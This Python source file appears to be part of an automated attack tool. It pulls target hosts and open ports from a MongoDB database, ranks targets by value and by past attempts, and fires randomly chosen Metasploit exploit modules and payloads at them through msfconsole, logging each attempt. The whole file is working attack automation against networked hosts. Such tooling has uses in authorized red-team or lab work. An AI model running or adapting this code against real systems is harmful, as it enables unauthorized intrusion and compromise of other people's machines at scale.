#!/user/bin/python

from pymongo import MongoClient
from random import randint
import time
import subprocess

def findTargets (runTime,dbIp,dbName,monkeyIq,monkeyLoc,monkeyId):
    timeout = time.time() + 60 * runTime

    while True:
        sploitFiles = []
        hostList = {}
        time.sleep(1)

        if time.time() > timeout:
            break

        conn = MongoClient(dbIp,27017)
        db = conn[dbName]
        hosts = db.hosts
        sploits = db.sploits

        if hosts.find({'location':monkeyLoc}).count() == 0:
            print 'Exploit monkey is waiting for work.  Eating bananas.  Will check again in 10 seconds.'
            time.sleep(10)

        else:
            for work in hosts.find({'location':monkeyLoc}):
                #Start priority calculation
                decisionCalc = ( int(monkeyIq) * int(db.targets.find_one({'ip' : work['ip']})['value']))/(db.actions.find({'ip' : work['ip'] }).count() + 1 ) + randint(1,10)
                hostList.update( {work['ip'] : decisionCalc } )

            target = max(hostList,key=hostList.get)
            openPorts = db.hosts.find_one({'ip' : target})['ports']

            if len(openPorts) > 0:
                sploitPort = openPorts[randint(0,len(openPorts)-1)]

                for sploit in sploits.find({'port':str(sploitPort)}):
                    sploitFiles.append(sploit['modName'])

            if len(sploitFiles)  == 0: #debug
                print 'No matching modules for selected target port ' + str(sploitPort) #debug

            else:
                launchedSploit = sploitFiles[randint(0,len(sploitFiles)-1)]
                lhostIp = db.monkeys.find_one({'id':monkeyId})['ip']
                payloadArray = getPayloads(launchedSploit)
                startTime = time.ctime()

                if len(payloadArray) > 0:
                    subprocess.call(['msfconsole','-x','\"use ' + launchedSploit + ';set PAYLOAD ' + payloadArray[randint(0,len(payloadArray)-1)] + ';set RHOST= ' +str(target) +  ';exploit;exit\"'])
                    endTime = time.ctime()
                    saveResults(db,hosts,target,sploitPort,startTime,endTime,monkeyId,launchedSploit)

#Need to be able to launch a payload that can be used with selected exploit
def getPayloads(sploitName):
    eligPayloads = []
    print sploitName #debug
    proc = subprocess.Popen(['msfconsole', '-x', '\"use ' + sploitName + '; show payloads; exit\"'],stdout=subprocess.PIPE)
    #print subprocess.list2cmdline(['msfcli', sploitName,'P']) debug
    for line in proc.stdout:
        if len(line.split()) > 0:
            if '/' in line.split()[0]:
                eligPayloads.append(line.split()[0])

    return eligPayloads

def saveResults(dbConn,coll,target,port,startTime,endTime,monkeyId,exploit):
    action = dbConn.actions
    action.insert({'action':'exploit','ip':target,'port':port,'start':startTime,'end':endTime,'id':monkeyId,'exploit':exploit})
    return








